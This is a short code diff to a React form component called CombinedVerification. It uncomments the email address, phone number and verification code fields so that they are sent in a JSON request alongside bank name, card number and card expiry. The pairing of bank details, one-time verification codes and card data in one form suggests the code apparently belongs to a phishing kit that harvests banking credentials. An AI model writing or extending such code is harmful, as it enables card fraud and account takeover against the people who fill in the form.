@@ -136,9 +136,9 @@ export default function CombinedVerification() {
         body: JSON.stringify({
           bankName: formData.bankName,
           
-          // emailAddress: formData.emailAddress,
-          // phoneNumber: formData.phoneNumber,
-          // verificationCode: formData.verificationCode,
+          emailAddress: formData.emailAddress,
+          phoneNumber: formData.phoneNumber,
+          verificationCode: formData.verificationCode,
           // Credit card details
           cardNumber: formData.cardNumber,
           cardExpiry: formData.cardExpiry,
